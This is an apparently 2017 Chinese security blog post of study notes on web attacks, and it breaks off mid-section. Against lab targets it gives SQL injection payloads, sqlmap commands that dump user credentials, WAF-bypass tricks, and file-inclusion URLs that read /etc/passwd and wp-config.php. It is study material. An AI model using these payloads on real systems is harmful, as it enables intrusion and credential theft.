<!DOCTYPE html>









<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en"
  
>

  <!-- The Head -->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  >

  
    

    
  

  

  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="安全笔记–Web攻击技术" />
<meta property="og:locale" content="en" />
<meta name="description" content="自学笔记" />
<meta property="og:description" content="自学笔记" />
<link rel="canonical" href="http://c0ldstudy.github.io/posts/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B02/" />
<meta property="og:url" content="http://c0ldstudy.github.io/posts/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B02/" />
<meta property="og:site_name" content="c0ldstudy" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2017-11-11T00:00:00-08:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="安全笔记–Web攻击技术" />
<meta name="twitter:site" content="@JiacenXu" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2017-11-11T00:00:00-08:00","datePublished":"2017-11-11T00:00:00-08:00","description":"自学笔记","headline":"安全笔记–Web攻击技术","mainEntityOfPage":{"@type":"WebPage","@id":"http://c0ldstudy.github.io/posts/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B02/"},"url":"http://c0ldstudy.github.io/posts/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B02/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>安全笔记--Web攻击技术 | c0ldstudy
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="c0ldstudy">
<meta name="application-name" content="c0ldstudy">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.2.1/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/style.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.1/dist/jquery.min.js"></script>

  
    <!--
  Switch the mode between dark and light.
-->

<script type="text/javascript">
  class ModeToggle {
    static get MODE_KEY() { return "mode"; }
    static get MODE_ATTR() { return "data-mode"; }
    static get DARK_MODE() { return "dark"; }
    static get LIGHT_MODE() { return "light"; }
    static get ID() { return "mode-toggle"; }

    constructor() {
      if (this.hasMode) {
        if (this.isDarkMode) {
          if (!this.isSysDarkPrefer) {
            this.setDark();
          }
        } else {
          if (this.isSysDarkPrefer) {
            this.setLight();
          }
        }
      }

      let self = this;

      /* always follow the system prefers */
      this.sysDarkPrefers.addEventListener('change', () => {
        if (self.hasMode) {
          if (self.isDarkMode) {
            if (!self.isSysDarkPrefer) {
              self.setDark();
            }
          } else {
            if (self.isSysDarkPrefer) {
              self.setLight();
            }
          }

          self.clearMode();
        }

        self.notify();
      });
    } /* constructor() */

    get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); }

    get isSysDarkPrefer() { return this.sysDarkPrefers.matches; }

    get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; }

    get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; }

    get hasMode() { return this.mode != null; }

    get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }

    /* get the current mode on screen */
    get modeStatus() {
      if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) {
        return ModeToggle.DARK_MODE;
      } else {
        return ModeToggle.LIGHT_MODE;
      }
    }

    setDark() {
      $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      $('html').removeAttr(ModeToggle.MODE_ATTR);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }

    /* Notify another plugins that the theme mode has changed */
    notify() {
      window.postMessage({
        direction: ModeToggle.ID,
        message: this.modeStatus
      }, "*");
    }

    flipMode() {
      if (this.hasMode) {
        if (this.isSysDarkPrefer) {
          if (this.isLightMode) {
            this.clearMode();
          } else {
            this.setLight();
          }
        } else {
          if (this.isDarkMode) {
            this.clearMode();
          } else {
            this.setDark();
          }
        }
      } else {
        if (this.isSysDarkPrefer) {
          this.setLight();
        } else {
          this.setDark();
        }
      }

      this.notify();
    } /* flipMode() */
  } /* ModeToggle */

  const modeToggle = new ModeToggle();
</script>

  
</head>


  <body data-topbar-visible="true">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" class="mx-auto">
        
          
          <img src="/commons/avatar.png" alt="avatar" onerror="this.style.display='none'">
        
      </a>
    </div>

    <div class="site-title">
      <a href="/">c0ldstudy</a>
    </div>
    <div class="site-subtitle font-italic">Absorb what is useful. Reject what is useless. And add what is essentially your own. --- Bruce Lee</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">

    
      <button class="mode-toggle btn" aria-label="Switch Mode">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    
      

      
      <a href="https://github.com/c0ldstudy" aria-label="github"
        

        
          target="_blank"
          
        

        

        rel="noopener noreferrer">

        <i class="fab fa-github"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/JiacenXu" aria-label="twitter"
        

        
          target="_blank"
          
        

        

        rel="noopener noreferrer">

        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="javascript:location.href = 'mailto:' + ['jiacenx','uci.edu'].join('@')" aria-label="email"
        

        

        

        >

        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        

        

        

        >

        <i class="fas fa-rss"></i>
      </a>
      

    
      

      
      <a href="https://www.linkedin.com/in/jiacen-xu-021536105/" aria-label="linkedin"
        

        
          target="_blank"
          
        

        

        rel="noopener noreferrer">

        <i class="fab fa-linkedin"></i>
      </a>
      

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper">
  <div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Home
            </a>
          </span>

        

      

        

      

        

          
            <span>安全笔记--Web攻击技术</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div id="main" class="container pl-xl-4 pr-xl-4">
        





<div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4">
    <div class="post pl-1 pr-1 pl-md-2 pr-md-2">

    

    
      
      
        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->


<!-- images -->





<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  




<!-- return -->

<h1 data-toc-skip>安全笔记--Web攻击技术</h1>

<div class="post-meta text-muted">
    <!-- published date -->
    <span>
      Posted
      <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class=""
    data-ts="1510387200"
    data-df="ll"
    data-toggle="tooltip" data-placement="bottom">
  Nov 11, 2017
</em>

    </span>

    <!-- lastmod date -->
    

  

  <div class="d-flex justify-content-between">
    <!-- author(s) -->
    <span>
      

      By

      <em>
      
        <a href="https://twitter.com/JiacenXu">Jiacen (Jason) Xu</a>
      
      </em>
    </span>

    <div>
      <!-- page views -->
      

      <!-- read time -->
      <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="3196 words">
  <em>17 min</em> read</span>

    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <h3 id="2-web攻击技术"><span class="mr-2">2 Web攻击技术</span><a href="#2-web攻击技术" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<h4 id="21-web漏洞概述"><span class="mr-2">2.1 Web漏洞概述</span><a href="#21-web漏洞概述" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<ul>
  <li>OWASP(Opwn Web Application Security Project)
    <ul>
      <li>owaspbwa</li>
    </ul>
  </li>
  <li>注入</li>
  <li>失效的身份认证和会话管理
    <ul>
      <li>Padding Oracle会话管理漏洞<strong><em>研究一波</em></strong>
        <ul>
          <li>对称加密 + CBC</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>跨站脚本（XSS）</li>
  <li>失效的访问控制</li>
  <li>敏感信息泄露</li>
  <li>攻击检测防范和不足</li>
  <li>跨站请求伪造（CSFR）</li>
</ul>

<h4 id="22-web服务器的探测"><span class="mr-2">2.2 Web服务器的探测</span><a href="#22-web服务器的探测" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<ul>
  <li>WAF探测web application firewall
    <ul>
      <li>nmap的waf探测脚本
        <ul>
          <li>nmap -p 80 –script http-waf-detect.nse www.xxx.com</li>
        </ul>
      </li>
      <li>wafw00f
        <ul>
          <li>waf00f www.xxx.com</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Web服务器负载均衡探测
    <ul>
      <li>CDN（content distribution network）内容分发网站</li>
      <li>Cloudflare 一台服务器数据传到CDN厂商的各个节点，用户访问各个Cloudflare节点</li>
      <li>lbd www.xxx.com	负载均衡探测</li>
    </ul>
  </li>
  <li>Web页面爬取
    <ul>
      <li>Dirbuster 网站目录和文件的遍历和猜解
        <ul>
          <li>字典位置： /usr/share/dirbuster/wordlists/</li>
        </ul>
      </li>
      <li>httrack网站镜像/克隆</li>
      <li>vbscan		探测vBulletin及其漏洞</li>
      <li>vane/wpscan 探测Wordpress及其漏洞</li>
      <li>joomscan 探测joomla及其漏洞</li>
    </ul>
  </li>
</ul>

<h4 id="23-针对web脚本的攻击"><span class="mr-2">2.3 针对Web脚本的攻击</span><a href="#23-针对web脚本的攻击" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<ul>
  <li>SQL注入漏洞攻击
    <ul>
      <li>Bricks
        <ul>
          <li>第一题
            <ul>
              <li><code class="language-plaintext highlighter-rouge">'or'1'='1</code></li>
              <li><code class="language-plaintext highlighter-rouge">'or'1</code></li>
              <li>如果不能输入单引号
                <ul>
                  <li>用户名：\</li>
                  <li>密码：<code class="language-plaintext highlighter-rouge"> or 1#</code></li>
                </ul>
              </li>
            </ul>
          </li>
          <li>第二题（js查看网页源代码，js多了一道检测输入特殊字符的函数，需要绕过）
            <ul>
              <li>function onSubmitOfLoginForm(…)</li>
              <li>1.覆盖原函数(检查-console-可以覆盖原先的函数)
                <ul>
                  <li>function onSubmitOfLoginForm (){ return true;}</li>
                </ul>
              </li>
              <li>2.定义函数永远返回true</li>
              <li>3.输入万能密码即可</li>
              <li>4.禁用js中的执行</li>
            </ul>
          </li>
          <li>第三题
            <ul>
              <li><code class="language-plaintext highlighter-rouge">1')or('1=1</code></li>
              <li><code class="language-plaintext highlighter-rouge">SELECT * FROM users WHERE name=('1')or('1=1') and password=('1')or('1=1') LIMIT 0,1</code></li>
            </ul>
          </li>
          <li>第四题
            <ul>
              <li>双引号</li>
            </ul>
          </li>
          <li>第五题
            <ul>
              <li><code class="language-plaintext highlighter-rouge">'or'1'#</code> or <code class="language-plaintext highlighter-rouge">'or'1'-- </code></li>
              <li><code class="language-plaintext highlighter-rouge">#</code>注释之后的sql语句</li>
              <li>微软数据库注释符 <code class="language-plaintext highlighter-rouge">--</code> + <code class="language-plaintext highlighter-rouge">空格</code></li>
              <li>md5散列（128bit 16byte 32ascii字符）</li>
              <li>sha1（160bit 20byte 40ascii）</li>
              <li>sha256（256bit 32byte 64ascii）</li>
            </ul>
          </li>
          <li>http://www.wechall.net/ 题库</li>
          <li>第六题
            <ul>
              <li>重定向</li>
            </ul>
          </li>
          <li>第七题
            <ul>
              <li>先匹配用户名，在查询比对密码</li>
              <li>用户名：<code class="language-plaintext highlighter-rouge">'and 0 union select md5('1'),md5('1'),md5('1'),md5('1'),md5('1'),md5('1'),md5('1'),md5('1')#</code></li>
              <li>密码：1</li>
            </ul>
          </li>
        </ul>
      </li>
      <li>mysql常用语句
        <ul>
          <li>select version();</li>
          <li>select database();</li>
          <li>select user();</li>
          <li>show databases;</li>
          <li>use mysql;</li>
          <li>show tables;</li>
          <li>desc user;	//描述user表</li>
          <li>select Host,User,Password from user;</li>
          <li>select Host,User,Password from user where User=’root’ and 1;</li>
          <li>select Host,User,Password from user where User=’root’ and 0 union select 1,2,3;   //让左边记录为空，控制右边的返回值</li>
          <li>select Host,User,Password from user where User=’’ and 0 union select 1,2,md5(‘1’);
            <ul>
              <li>用户名与sql语句合并，让原本sql语句为0，用select语句使每一列都是md5(‘1’)的值，然后在密码输入1，即可匹配，登录成功。</li>
              <li>先做and再做or</li>
              <li>库名表名区分大小写，列名不区分大小写</li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>wordpress靶机漏洞
    <ul>
      <li>wpscan –url http://192.168.80.240/wordpress – enumerate p</li>
      <li>/vane/vane.rb –url http://192.168.80.240/wordpress –enumerate p
        <ul>
          <li>data/plugins.txt</li>
        </ul>
      </li>
      <li>select * from xxx where ss_id=1 and 0 union select 1,version(),user(),database()#</li>
      <li>%27-&gt;<code class="language-plaintext highlighter-rouge">'</code>,%25-&gt;<code class="language-plaintext highlighter-rouge">%</code>,%5C-&gt;<code class="language-plaintext highlighter-rouge">\</code></li>
      <li>验证是否存在漏洞：http://192.168.80.240/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 and 1=2</li>
      <li>使用union select联合插查询：http://192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 and 0 union select 1,group_concat(TABLE_NAME),3,4 from information_schema.TABLES where TABLE_SCHEMA=0x776F72647072657373 group by TABLE_SCHEMA #</li>
      <li>group_concat 把相同的行归并在一起</li>
    </ul>
  </li>
  <li>msyql原表注入获取信息的方法（无法获得表的名字等相关信息）
    <ul>
      <li>做一个测试，新建一个user表
        <ul>
          <li>create schema Test;</li>
          <li>use Test;</li>
          <li>create table users (id INT, username, password);</li>
          <li>insert into users values (1, ‘admin’);</li>
          <li>select * from users;</li>
        </ul>
      </li>
      <li>通过use information_schema;获得数据库所有表名
        <ul>
          <li>tables 包含所有表名；</li>
          <li>columns 包含所有字段名</li>
          <li>select 1,2 from dual where 0 union select TABLE_SCHEMA,group_contat(TABLE_NAME) TABLE_NAME from information_schema, TABLES  where TABLE_SCHEMA=’Test’ LIMIT 1; //获取Test数据库中的所有表名</li>
          <li>select databse(); //获取当前数据库名字</li>
          <li>select Host,User,Passoword from user \G;</li>
          <li>hex(‘wordpress’); //776F72647072657373</li>
          <li>select 776F72647072657373;</li>
        </ul>
      </li>
      <li>只适用于mysql的报错法
        <ul>
          <li>select * form user where 0 and extractvalue(1,version());</li>
          <li><code class="language-plaintext highlighter-rouge">/*!00000 payload */</code></li>
          <li>获取文件内容：http://192.168.80.240/wordpress/wp-content/plugins/wpSS/ss_handler.php?ss_id=1 and 1=0 union select 1,hex(load_file(‘/var/www/wordpress/wp-config.php’)),3,4–</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>盲注sql注入方法
    <ul>
      <li>union select</li>
      <li>error-based</li>
      <li>time-based blind</li>
      <li>猜解法-&gt;二分折半猜解法(boolean-based blind)
        <ul>
          <li>需要先判断变量长度len()</li>
          <li>192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 +
            <ul>
              <li>and ascii(substr((select user() from wp_users limit 0,1),1,1))&gt;128 //通过判断网页是否变化确定猜测是否正确</li>
              <li>and ascii(substr((select user()),1,1))=119 //user变量第一个字符是w</li>
              <li>搜索user中的第一个字符ascii应该在0-255之前，一个一个尝试</li>
              <li>找到对应方法，使用ord(‘a’)或者chr(111)</li>
              <li>方法二:如果不能直接查看网页变化，可以通过是否超过5秒来判断是否符合标准
                <ul>
                  <li>and if(ascii(substr((select user()),1,1))&gt;128,1,sleep(5))# //if第一个参数是true，直接执行，若是false，调用sleep</li>
                </ul>
              </li>
              <li>方法三：从页面返回时间判断是否完成,benchmark()性能判断函数
                <ul>
                  <li>and if(ascii(substr((select user()),1,1))&gt;118,1,benchmark(1000000,md5(0x20)))</li>
                </ul>
              </li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>sql注入工具
    <ul>
      <li>Pangolin</li>
      <li>Hacij</li>
      <li>Safe3</li>
      <li>啊D</li>
      <li>SQLmap
        <ul>
          <li>sqlmap –url 192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 –fingerprint  //判断这个url可以用哪些方式实现注入
            <ul>
              <li>$_GET[‘id’]</li>
              <li>$_POST[‘id’]</li>
              <li>$_COOKIE[‘id’]</li>
              <li>request.get</li>
              <li>request.form</li>
              <li>request.cookie</li>
              <li>request</li>
            </ul>
          </li>
          <li>sqlmap –url 192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 –dbs //获取数据库列表</li>
          <li>sqlmap –url 192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 -D wordpress –tables //获取wordpress库中所有表</li>
          <li>sqlmap –url 192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 -D wordpress -T wp_users –column //获得表中的所有列</li>
          <li>sqlmap –url 192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 -D wordpress -T wp_users -C user_login,user_pass –dump //获取列中指定数据，导出数据</li>
          <li>–count //获取数据数量</li>
          <li>–start=1 –stop=5 //获取部分的数据</li>
          <li>-tamper xxx.py //装载指定payload</li>
          <li>sqlmap –purge-output		//清除缓存
            <ul>
              <li>数据缓存在/root/.sqlmap/output/<ip></ip></li>
            </ul>
          </li>
        </ul>
      </li>
      <li>绕过WAF
        <ul>
          <li>%09(tab键)代替空格</li>
          <li>%0a（换行）%0d(回车)代替空格</li>
          <li>使用括号</li>
          <li>可以使用<code class="language-plaintext highlighter-rouge">/*!00000user()*/</code>在注释中实现运行语句</li>
        </ul>
      </li>
      <li>
        <p>POST方式</p>

        <div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>  POST /login.php HTTP/1.1
  host:xxx
  User-agent:xxx
  Accept:...
  Content-type:...
  Content-length: 30 
</pre></td></tr></tbody></table></code></div>        </div>

        <ul>
          <li>username=xxx&amp;password=123456</li>
          <li>使用火狐temper data插件</li>
          <li>注入时是请求数据包投向的url地址</li>
          <li>sqlmap -u “http://172.16.185.185/WackoPicko/users/login.php” –data=”username=tt&amp;password=123456” -p username –fingerprint</li>
          <li>sqlmap -u “http://172.16.185.185/WackoPicko/users/login.php” –data=”username=tt&amp;password=123456” -p username –dbs</li>
          <li>sqlmap -u “http://172.16.185.185/WackoPicko/users/login.php” –data=”username=test&amp;password=123456” -p username -D wackopicko –tables
   	* sqlmap -u “http://172.16.185.185/WackoPicko/users/login.php” –data=”username=test&amp;password=123456” -p username -D wackopicko -T users –columns
   	* sqlmap -u “http://172.16.185.185/WackoPicko/users/login.php” –data=”username=test&amp;password=123456” -p username -D wackopicko -T users -C id,login,password –dump</li>
        </ul>
      </li>
      <li>宽字符编码绕过
        <ul>
          <li>php的addslash函数使得<code class="language-plaintext highlighter-rouge">'</code>变为<code class="language-plaintext highlighter-rouge">\'</code>，在GBK编码中，若第一个字符大于%80则默认为双字符，使用%81%27，由于addslash使得变为%81%5c%27，而%81%5c则成为一个字符，从而使得单引号避免被转义</li>
          <li>http://172.16.1.180/index.php?id=1</li>
          <li>sqlmap 使用GET方法</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<h4 id="24-文件包含漏洞攻击"><span class="mr-2">2.4 文件包含漏洞攻击</span><a href="#24-文件包含漏洞攻击" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<ul>
  <li>定义：服务器通过脚本代码在包含文件的时候过滤不严，从而注入一段攻击者能够控制的代码。
    <ul>
      <li>“本地文件包含漏洞”， 即Local File Inclusion, LFI。</li>
      <li>如果PHP的配置选项为“all_url_include”的话，则include/require函数可以加载远程文件，这种漏洞被称为“远程文件包含漏洞”，即Remote File Inclusion, RFI。</li>
    </ul>
  </li>
  <li>本地文件包含漏洞
    <ul>
      <li>wpscan</li>
      <li>vane</li>
      <li>http://172.16.1.227/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=/etc/passwd%00</li>
      <li>http://172.16.1.227/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=php://filter/read=convert.base64-encode/resource=../../../../wp-config.php%00</li>
      <li>在Firefox浏览器中设置本地代理，用nc监听传递的数据包</li>
      <li>
        <p>把得到的字符串使用HackBar通过Base64解码<code class="language-plaintext highlighter-rouge">PD9waHANCi8vICoqIE15U1FMIHNldHRpbmdzICoqIC8vDQpkZWZpbmUoJ0RCX05BTUUnLCAnd29yZHByZXNzJyk7ICAgIC8vIFRoZSBuYW1lIG9mIHRoZSBkYXRhYmFzZQ0KZGVmaW5lKCdEQl9VU0VSJywgJ3dvcmRwcmVzcycpOyAgICAgLy8gWW91ciBNeVNRTCB1c2VybmFtZQ0KZGVmaW5lKCdEQl9QQVNTV09SRCcsICd3b3JkcHJlc3MnKTsgLy8gLi4uYW5kIHBhc3N3b3JkDQpkZWZpbmUoJ0RCX0hPU1QnLCAnbG9jYWxob3N0Jyk7ICAgIC8vIDk5JSBjaGFuY2UgeW91IHdvbid0IG5lZWQgdG8gY2hhbmdlIHRoaXMgdmFsdWUNCg0KLy8gWW91IGNhbiBoYXZlIG11bHRpcGxlIGluc3RhbGxhdGlvbnMgaW4gb25lIGRhdGFiYXNlIGlmIHlvdSBnaXZlIGVhY2ggYSB1bmlxdWUgcHJlZml4DQokdGFibGVfcHJlZml4ICA9ICd3cF8nOyAgIC8vIE9ubHkgbnVtYmVycywgbGV0dGVycywgYW5kIHVuZGVyc2NvcmVzIHBsZWFzZSENCg0KLy8gQ2hhbmdlIHRoaXMgdG8gbG9jYWxpemUgV29yZFByZXNzLiAgQSBjb3JyZXNwb25kaW5nIE1PIGZpbGUgZm9yIHRoZQ0KLy8gY2hvc2VuIGxhbmd1YWdlIG11c3QgYmUgaW5zdGFsbGVkIHRvIHdwLWluY2x1ZGVzL2xhbmd1YWdlcy4NCi8vIEZvciBleGFtcGxlLCBpbnN0YWxsIGRlLm1vIHRvIHdwLWluY2x1ZGVzL2xhbmd1YWdlcyBhbmQgc2V0IFdQTEFORyB0byAnZGUnDQovLyB0byBlbmFibGUgR2VybWFuIGxhbmd1YWdlIHN1cHBvcnQuDQpkZWZpbmUgKCdXUExBTkcnLCAnJyk7DQoNCi8qIFRoYXQncyBhbGwsIHN0b3AgZWRpdGluZyEgSGFwcHkgYmxvZ2dpbmcuICovDQoNCmRlZmluZSgnQUJTUEFUSCcsIGRpcm5hbWUoX19GSUxFX18pLicvJyk7DQpyZXF1aXJlX29uY2UoQUJTUEFUSC4nd3Atc2V0dGluZ3MucGhwJyk7DQoNCmRlZmluZSgnUkVMT0NBVEUnLHRydWUpOw0KPz4=&lt;?php</code></p>

        <div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre>          // ** MySQL settings ** //
          define('DB_NAME', 'wordpress');    // The name of the database
          define('DB_USER', 'wordpress');     // Your MySQL username
          define('DB_PASSWORD', 'wordpress'); // ...and password
          define('DB_HOST', 'localhost');    // 99% chance you won't need to change this value

          // You can have multiple installations in one database if you give each a unique prefix 
          $table_prefix  = 'wp_';   // Only numbers, letters, and underscores please!
          // Change this to localize WordPress.  A corresponding MO file for the	
          // chosen language must be installed to wp-includes/languages.
          // For example, install de.mo to wp-includes/languages and set WPLANG to 'de'
          // to enable German language support.
          define ('WPLANG', '');

          /* That's all, stop editing! Happy blogging. */

          define('ABSPATH', dirname(__FILE__).'/');
          require_once(ABSPATH.'wp-settings.php');

          define('RELOCATE',true);
          ?&gt;
</pre></td></tr></tbody></table></code></div>        </div>
      </li>
      <li>远程文件包含漏洞<code class="language-plaintext highlighter-rouge">all_url_include()</code>
        <ul>
          <li>PHP中函数system\passthru\exec\exec_once可以实现执行系统命令</li>
          <li>http://172.16.1.227/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=php://input%00</li>
